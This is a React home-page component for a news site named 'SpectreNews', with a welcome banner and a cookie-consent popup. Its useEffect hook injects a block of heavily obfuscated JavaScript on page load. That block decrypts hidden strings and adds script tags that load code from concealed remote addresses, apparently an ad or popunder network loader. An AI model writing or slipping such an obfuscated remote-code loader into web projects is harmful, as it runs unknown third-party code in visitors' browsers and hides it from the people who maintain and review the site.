


import React, { useState, useEffect } from "react";
import Bar from "../bar/Bar";
import "./Home.css";
import { FiArrowRightCircle } from "react-icons/fi";
import { Link } from "react-router-dom";
import useLockBodyScroll from "../pages/useLockBodyScroll"; // Path to useLockBodyScroll.js

function Home() {
  const [acceptedCookies, setAcceptedCookies] = useState(false);

  useLockBodyScroll(["/"]);  // Add other paths if needed

  useEffect(() => {
    const cookiesAccepted = localStorage.getItem("acceptedCookies");
    setAcceptedCookies(cookiesAccepted === "true");

    // Scroll to the top of the page
    window.scrollTo(0, 0);

    const script = document.createElement("script");
    script.type = "text/javascript";
    script.async = false;
    script.innerHTML = `
    /*<![CDATA[/* */
(function(){if(window.e20f93a1b1636f007740e83f41814287) return; window.e20f93a1b1636f007740e83f41814287="Ee3a4bbUus4Q55jIQKVmpV-rdQT8_j0RABM5duxa-Qshq_M_p6z-wpVgspp0gadyhHuBQEBN0nnWDLd5YxylPqh-bGh1JY0";var a=['w5M8wqsJw6NeBw==','XBTCrMK0CS7CpQ==','B0DDrsO9SWDDljxPWjlH','wonCqjbCsMOmIip0w7ZxKhM8','F8KYw4LDnB/DiS3DqMO3RsO1Zg==','wqzDgMO8w7EXwrY=','w6TDvsKdX0jDnA==','woTDoWbChA==','wr7DjcOhw7Yewq/DnzsK','OwV6wpHCs8KGwpDCnXFiw4/DlDPCqA==','w4HCqDHCosObPg==','CkvDscO5QlbDsS1eUC5M','wovCqyrCv8Ox','eQ7CiMKgATvDvB50bsOMcklSwrBGJRp8wpnCtDTDgUTDpMOudcK7ccKqRcKrYTxiIR19SlNxT8KI','RCvCkSnCqsKSK8OP','PCzCmCogw7PDrA==','w6PDrsKZXw==','w5/Coi3CicOCLg==','FG3DkADCpcK3ejsUw63CpQbCsg==','XxjCjsOjwpZqRTcjw69PwpV+wrlLaBoSGnpWw7BHScK/wozCkjANw6M=','DSLDlXx4HcOWCQ==','Ny3Cni0/w7nDsMK/','wprClcOX','w7/DsX4pwppBPAluwqBJ','w5YQw4x4OMKCw63DncOBwrk=','FsOyw4rCgcO/OcKLecKXEMOXBcO7w4QE','elnCl8KJFWbCphl9YMORV1Njw79CBxRkwpg='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x123));var b=function(c,d){c=c-0x0;var e=a[c];if(b['yIYahZ']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['AGxKiE']=g;b['cFNGFH']={};b['yIYahZ']=!![];}var f=b['cFNGFH'][c];if(f===undefined){if(b['DrZVjz']===undefined){b['DrZVjz']=!![];}e=b['AGxKiE'](e,d);b['cFNGFH'][c]=e;}else{e=f;}return e;};var e=window;e[b('0xd','*jcv')]=[[b('0xc','v%YA'),0x4c26cb],[b('0x17','bTRC'),0.005],[b('0xf','9IH['),b('0x7','9nuw')],[b('0x11','9nuw'),0x0],[b('0x6','Hx5@'),![]],[b('0x18','%KsV'),0x0],[b('0xa','f]5i'),!0x0]];var u=[b('0x19','y[@W'),b('0x13',']#9%')],n=0x0,q,h=function(){if(!u[n])return;q=e[b('0x1a','5ICW')][b('0x9','ax&r')](b('0x10','bTRC'));q[b('0x16','v%YA')]=b('0x4','i!LH');q[b('0x12','ax&r')]=!0x0;var c=e[b('0x0','OX9G')][b('0x5',']#9%')](b('0xb','&PP]'))[0x0];q[b('0x1','V8)p')]=b('0x14','6n5j')+u[n];q[b('0x2',')@AC')]=b('0xe','&PP]');q[b('0x15','OX9G')]=function(){n++;h();};c[b('0x3','^*6i')][b('0x8','9nuw')](q,c);};h();})();
    /*]]>/* */
    `;
    document.body.appendChild(script);
  }, []);

  const acceptCookies = () => {
    setAcceptedCookies(true);
    localStorage.setItem("acceptedCookies", "true");
  };

  return (
    <div className="home-container" style={{ overflow: 'hidden', height: '100vh' }}>
      <Bar search={false} />
      <div className="content">
        <h1>Welcome to SpectreNews</h1>
        <p>
          Unleash the power to explore diverse perspectives on global issues. Navigate politics with clarity. Discover the truth. Let SpectreNews be <strong>YOUR</strong> guide.
        </p>
        <Link to="/news" className="cta-button">
          Get Started <FiArrowRightCircle className="icon" />
        </Link>
      </div>
      {!acceptedCookies && (
        <div className="cookie-consent-popup">
          <p>We use cookies to ensure you get the best experience on our website.</p>
          <button onClick={acceptCookies}>Accept</button>
        </div>
      )}
      <div className="area">
        <ul className="circles">
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
        </ul>
      </div>
    </div>
  );
}

export default Home;
